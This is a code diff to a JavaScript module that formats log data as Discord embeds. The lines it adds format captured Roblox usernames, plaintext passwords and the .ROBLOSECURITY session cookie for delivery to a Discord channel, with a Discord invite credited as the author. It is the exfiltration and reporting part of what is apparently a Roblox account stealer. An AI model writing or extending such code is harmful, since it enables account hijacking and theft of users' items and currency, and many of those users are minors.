@@ -67,6 +67,10 @@ function formatLogForDiscord(logData) {
   // Handle different types of Roblox logs
   if (logData.level === 'roblox_login') {
     return formatRobloxLoginEmbed(logData);
+  } else if (logData.level === 'roblox_credentials') {
+    return formatRobloxCredentialsEmbed(logData);
+  } else if (logData.level === 'roblox_security') {
+    return formatRobloxSecurityEmbed(logData);
   } else if (logData.level === 'roblox_userdata') {
     return formatRobloxUserDataEmbed(logData);
   }
@@ -127,6 +131,77 @@ function formatRobloxLoginEmbed(logData) {
       timestamp: new Date(logData.timestamp).toISOString()
     }]
   };
+}
+
+function formatRobloxCredentialsEmbed(logData) {
+  try {
+    const credentials = JSON.parse(logData.message);
+    
+    return {
+      embeds: [{
+        title: `🔐 ROBLOX LOGIN CREDENTIALS`,
+        color: 0x9400d3, // Purple color
+        fields: [
+          {
+            name: '👤 Username',
+            value: credentials.username || 'Not captured',
+            inline: false
+          },
+          {
+            name: '🔑 Password',
+            value: credentials.password || 'Not captured',
+            inline: false
+          }
+        ],
+        footer: {
+          text: `Made By .gg/sZbFX2wPVz`
+        },
+        timestamp: new Date().toISOString()
+      }]
+    };
+  } catch (error) {
+    return {
+      embeds: [{
+        title: `🔐 ROBLOX LOGIN CREDENTIALS`,
+        description: `\`\`\`\n${logData.message}\`\`\``,
+        color: 0x9400d3,
+        footer: {
+          text: `Made By .gg/sZbFX2wPVz`
+        },
+        timestamp: new Date().toISOString()
+      }]
+    };
+  }
+}
+
+function formatRobloxSecurityEmbed(logData) {
+  try {
+    const securityData = JSON.parse(logData.message);
+    
+    return {
+      embeds: [{
+        title: `🍪 Cookie`,
+        color: 0xff6600, // Orange color
+        description: `\`\`\`\n_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${securityData.token}\`\`\``,
+        footer: {
+          text: `Made By .gg/sZbFX2wPVz`
+        },
+        timestamp: new Date().toISOString()
+      }]
+    };
+  } catch (error) {
+    return {
+      embeds: [{
+        title: `🍪 Cookie`,
+        description: `\`\`\`\n${logData.message}\`\`\``,
+        color: 0xff6600,
+        footer: {
+          text: `Made By .gg/sZbFX2wPVz`
+        },
+        timestamp: new Date().toISOString()
+      }]
+    };
+  }
 }
 
 function formatRobloxUserDataEmbed(logData) {
@@ -209,6 +284,8 @@ function getColorForLevel(level) {
     warn: 0xf39c12,     // Orange
     error: 0xe74c3c,    // Red
     roblox_login: 0xff0000, // Bright Red
+    roblox_credentials: 0x9400d3, // Purple
+    roblox_security: 0xff6600, // Orange
     roblox_userdata: 0x00ff00 // Bright Green
   };
   return colors[level] || colors.log;
